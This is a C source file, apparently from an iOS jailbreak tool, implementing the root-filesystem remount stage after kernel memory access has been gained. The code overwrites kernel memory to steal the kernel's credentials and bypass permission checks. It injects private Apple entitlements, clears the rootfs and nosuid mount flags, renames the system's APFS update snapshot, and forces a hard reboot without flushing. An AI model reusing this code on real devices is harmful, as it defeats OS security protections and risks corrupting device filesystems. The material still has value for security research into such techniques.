#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <unistd.h>

#if __has_include(<sys/snapshot.h>)
#include <sys/snapshot.h>
#else
int fs_snapshot_list(int dirfd, struct attrlist* alist, void* attrbuf, size_t bufsize,
    uint32_t flags);
int fs_snapshot_rename(int dirfd, const char* old, const char* new, uint32_t flags);
#endif

#include "jailbreak.h"
#include "kcall.h"
#include "kents.h"
#include "kmem.h"
#include "kutils.h"

// Kernel.framework -> hfs/hfs_mount.h
struct hfs_mount_args {
    char* fspec; /* block special device to mount */
    uid_t hfs_uid; /* uid that owns hfs files (standard HFS only) */
    gid_t hfs_gid; /* gid that owns hfs files (standard HFS only) */
    mode_t hfs_mask; /* mask to be applied for hfs perms  (standard HFS only) */
    u_int32_t hfs_encoding; /* encoding for this volume (standard HFS only) */
    struct timezone hfs_timezone; /* user time zone info (standard HFS only) */
    int flags; /* mounting flags, see below */
    int journal_tbuffer_size; /* size in bytes of the journal transaction buffer */
    int journal_flags; /* flags to pass to journal_open/create */
    int journal_disable; /* don't use journaling (potentially dangerous) */
};

typedef struct val_attrs {
    uint32_t length;
    attribute_set_t returned;
    attrreference_t name_info;
} val_attrs_t;

// creds https://github.com/sbingner/snappy/blob/master/snappy.m#L90
int snapshot_count(const char* path)
{
#ifndef __LP64__
    // 32-bit devices only used HFS+ so it can't have any snapshots
    return 0;
#endif

    int dirfd = open(path, O_RDONLY);

    struct attrlist attr_list = { 0 };
    int total = 0;

    attr_list.commonattr = ATTR_BULK_REQUIRED;

    char* buf = (char*)calloc(2048, sizeof(char));
    int retcount;
    while ((retcount = fs_snapshot_list(dirfd, &attr_list, buf, 2048, 0)) > 0) {
        total += retcount;
        char* bufref = buf;

        for (int i = 0; i < retcount; i++) {
            val_attrs_t* entry = (val_attrs_t*)bufref;
            if (entry->returned.commonattr & ATTR_CMN_NAME) {
                LOG("found snap: %s", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
            }
            bufref += entry->length;
        }
    }
    free(buf);

    if (retcount < 0) {
        LOG("fs_snapshot_list: %s", strerror(errno));
        return -1;
    }

    return total;
}

int snapshot_rename(const char* path, const char* from, const char* to)
{
    int ret = 0;

    int fd = open(path, O_RDONLY);

    ret = fs_snapshot_rename(fd, from, to, 0);

    close(fd);

    return ret;
}

const char* get_root_snapshot_name(const char* path)
{
    int dirfd = open(path, O_RDONLY);

    struct attrlist attr_list = { 0 };
    // int total = 0;

    attr_list.commonattr = ATTR_BULK_REQUIRED;

    char* buf = (char*)calloc(2048, sizeof(char));
    int retcount;
    while ((retcount = fs_snapshot_list(dirfd, &attr_list, buf, 2048, 0)) > 0) {
        // total += retcount;
        char* bufref = buf;

        for (int i = 0; i < retcount; i++) {
            val_attrs_t* entry = (val_attrs_t*)bufref;
            if (entry->returned.commonattr & ATTR_CMN_NAME) {
                const char* snap_name = (char*)(&entry->name_info) + entry->name_info.attr_dataoffset;
                if (strncmp(snap_name, "com.apple.os.update-", strlen("com.apple.os.update-")) == 0) {
                    return strdup(snap_name);
                }
            }

            bufref += entry->length;
        }
    }

    free(buf);

    return NULL;
}

kptr_t vnode_from_path(const char* dev_path)
{
    LOG("finding vnode: %s", dev_path);

    kptr_t vfs_context_current = zm_fix_addr(kexecute(offs.funcs.vfs_context_current, 0));
    LOG("vfs_context_current: " ADDR, vfs_context_current);

    kptr_t kstr_buf = kalloc(strlen(dev_path) + 1);
    kwrite(kstr_buf, (void*)dev_path, (uint32_t)strlen(dev_path) + 1);

    // note to self: have to use vnode_lookup as you can't
    // get an fd on /dev/disk0s1s1 to pass to vnode_getfromfd
    kptr_t vnode_ptr = kalloc(sizeof(kptr_t));
    kexecute(offs.funcs.vnode_lookup, 4, kstr_buf, 0, vnode_ptr, vfs_context_current);
    kptr_t vnode = kread_kptr(vnode_ptr);
    LOG("got vnode: " ADDR, vnode);

    kfree(kstr_buf, strlen(dev_path) + 1);
    kfree(vnode_ptr, sizeof(kptr_t));

    if (vnode == 0x0) {
        LOG("failed to get vnode for %s", dev_path);
        return KERN_FAILURE;
    }

    return vnode;
}

kern_return_t patch_device_vnode(const char* dev_path)
{
    LOG("patching vnode for: %s", dev_path);
    kptr_t vnode = vnode_from_path(dev_path);
    if (vnode == 0x0) {
        LOG("failed to patch vnode");
        return KERN_FAILURE;
    }

    // we must 0 this else mount will return 'resource busy'
    kptr_t spec_info = kread_kptr(vnode + OFFSET_VNODE_V_SPECINFO);
    wk32(spec_info + OFFSET_V_SPECINFO_SI_FLAGS, 0); // zero our spec_flags

    return KERN_SUCCESS;
}

kern_return_t dunk_on_mac_mount()
{
    kern_return_t ret = 0;

    kptr_t rootfs_vnode = kread_kptr(offs.data.rootvnode + kernel_slide);
    if (rootfs_vnode == 0x0) {
        LOG("failed to find rootfs vnode");
        return KERN_FAILURE;
    }

    kptr_t v_mount = kread_kptr(rootfs_vnode + OFFSET_VNODE_V_MOUNT);
    if (v_mount == 0x0) {
        LOG("failed to find v_mount");
        return KERN_FAILURE;
    }

    uint32_t v_flag = rk32(v_mount + OFFSET_V_MOUNT_MNT_FLAG);
    if (v_flag == 0x0) {
        LOG("failed to find mnt_flag");
        return KERN_FAILURE;
    }

    // unset rootfs flag
    wk32(v_mount + OFFSET_V_MOUNT_MNT_FLAG, v_flag & ~MNT_ROOTFS);

    // remount
    struct statfs output;
    statfs("/", &output);
    char* name = strdup("/dev/disk0s1s1");
    ret = mount(output.f_fstypename, "/", MNT_UPDATE, &name);
    LOG("mount %s ret: %d", output.f_fstypename, ret);

    // test for failure
    int fd = open("/.spice_mount_test", O_CREAT | O_RDWR, 0644);
    if (fd < 0) {
        LOG("failed to mount");
        return KERN_FAILURE;
    }
    remove("/.spice_mount_test");
    close(fd);

    // read back new flags
    v_mount = kread_kptr(rootfs_vnode + OFFSET_VNODE_V_MOUNT);
    v_flag = rk32(v_mount + OFFSET_V_MOUNT_MNT_FLAG);

    // set rootfs flag back & unset nosuid
    v_flag = v_flag | MNT_ROOTFS;
    v_flag = v_flag & ~MNT_NOSUID;
    LOG("new v_flag: %x", v_flag);

    // set new flags
    wk32(v_mount + OFFSET_V_MOUNT_MNT_FLAG, v_flag);

    return ret;
}

kern_return_t remount_root_fs()
{
    kern_return_t ret = KERN_SUCCESS;

    int snap_count = snapshot_count("/");
    LOG("snap_count: %d", snap_count);

    // if the device *is* a snapshot, we won't be able to count them
    if (snap_count <= -1) {
        // rename the snapshot and say bye bye

        // mount the actual device to /var/tmp/rootfs
        if (access("/var/tmp/rootfs", F_OK) != 0) {
            mkdir("/var/tmp/rootfs", 0755);

            if (access("/var/tmp/rootfs", F_OK) != 0) {
                LOG("failed to create /var/tmp/rootfs dir!");
                return KERN_FAILURE;
            }
        }

        ret = patch_device_vnode("/dev/disk0s1s1");
        if (ret != KERN_SUCCESS)
            return ret;

        struct hfs_mount_args mnt_args;
        bzero(&mnt_args, sizeof(mnt_args));
        mnt_args.fspec = "/dev/disk0s1s1";
        mnt_args.hfs_mask = 1;
        gettimeofday(NULL, &mnt_args.hfs_timezone);

        // find credz
        kptr_t our_proc = find_proc(getpid());
        kptr_t our_ucred = kread_kptr(our_proc + OFFSET_PROC_P_UCRED);
        kptr_t kern_ucred = kread_kptr(find_proc(0) + OFFSET_PROC_P_UCRED);

        // set kern ucred (bypass perm. check)
        kwrite_kptr(our_proc + OFFSET_PROC_P_UCRED, kern_ucred);

        ret = mount("apfs", "/var/tmp/rootfs", 0, &mnt_args);
        if (ret != 0) {
            LOG("failed to call mount: %d (%d - %s)\n", ret, errno, strerror(errno));
            return KERN_FAILURE;
        }

        LOG("before rename:\n");
        snapshot_count("/var/tmp/rootfs");

        // grab private ents to allow spelunking with apfs
        const char* current_ents = get_current_entitlements(getpid());
        if (current_ents == NULL) {
            LOG("failed to get current entitlements!\n");
            return KERN_FAILURE;
        }

        ret = assign_new_entitlements(getpid(),
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
            "<plist version=\"1.0\">"
            "<dict>"
            "<key>com.apple.private.apfs.revert-to-snapshot</key>"
            "<true/>"
            "<key>com.apple.private.security.disk-device-access</key>"
            "<true/>"
            "<key>com.apple.private.vfs.snapshot</key>"
            "<true/>"
            "</dict>"
            "</plist>");
        if (ret != 0) {
            LOG("failed to assign new entitlements!\n");
            return KERN_FAILURE;
        }

        const char* root_snapshot = get_root_snapshot_name("/var/tmp/rootfs");

        if (root_snapshot == NULL) {
            LOG("failed to find root snapshot\n");
            return KERN_FAILURE;
        }

        ret = snapshot_rename("/var/tmp/rootfs", root_snapshot, "original_rootfs");

        // restore creds
        kwrite_kptr(our_proc + OFFSET_PROC_P_UCRED, our_ucred);

        if (ret != 0) {
            LOG("failed to rename snapshot from %s to original_rootfs: %d (%d - %s)\n", root_snapshot, ret, errno, strerror(errno));
            return KERN_FAILURE;
        }

        free((void*)root_snapshot);

        LOG("after rename:\n");
        snapshot_count("/var/tmp/rootfs");

        // restore ents
        assign_new_entitlements(getpid(), current_ents);
        free((void*)current_ents);

        // now reboot
        // TODO: improve this
        LOG("going down for reboot after renaming...");
        sleep(3);

        // note to self: 0x400 causes hard reboot w/o flushin any fs shit
        // without this, snapshot rename won't come into place
        reboot(0x400);

        return KERN_SUCCESS;
    }

    return dunk_on_mac_mount();
}
